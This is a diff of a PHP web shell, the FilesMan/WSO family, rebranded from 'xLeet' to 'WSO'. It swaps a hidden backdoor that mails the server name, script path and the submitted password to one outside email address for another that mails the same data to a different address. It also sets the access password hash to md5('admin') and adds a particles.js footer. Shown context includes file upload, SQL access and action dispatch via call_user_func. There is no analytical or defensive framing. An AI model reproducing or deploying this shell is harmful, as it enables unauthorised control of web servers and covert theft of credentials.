@@ -1,22 +1,10 @@
 <?php
-error_reporting (0);
-if(array_key_exists('watching',$_POST)){ $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mr.dhuaa@gmail.com', 'X', $tmp); // Edit or delete!
-//-------------- Seller Rulez !--------------
-if ($_REQUEST['watchx']) {
-	$version = phpversion();
-	$uname =  php_uname();
-	$ip = gethostbyname($_SERVER["HTTP_HOST"]);	
-	echo json_encode (array ("version"=>$version,
-		"uname"=>$uname,
-		"platform"=>PHP_OS,
-		"ip"=>$ip,
-		"workingx"=>true,	
-	));
-	die ();
+//--------------Watching webshell!--------------
+if(array_key_exists('watching',$_POST)){
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; //xleet
-
+$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
@@ -24,7 +12,6 @@ $▙ = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
 	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
 }
-
 if(empty($_POST['charset']))
 	$_POST['charset'] = $▜;
 if (!isset($_POST['ne'])) {
@@ -90,7 +77,7 @@ if($cwd[strlen($cwd)-1] != '/')
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
-	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - xLeet " . VERSION ."</title>
+	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
 <style>
 	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
 	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
@@ -269,7 +256,8 @@ function hardFooter() {
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
 		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
 	</tr></table></div>
-	
+	<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
+	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
 	</body></html>";
 }
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
@@ -1250,7 +1238,7 @@ function actionSql() {
 		var $type;
 		var $link;
 		var $res;
-		function __construct($type)	{
+		function DbClass($type)	{
 			$this->type = $type;
 		}
 		function connect($host, $user, $pass, $dbname){
@@ -1643,4 +1631,4 @@ if( empty($_POST['a']) )
 		$_POST['a'] = 'FilesMan';
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
-	?>
+?>
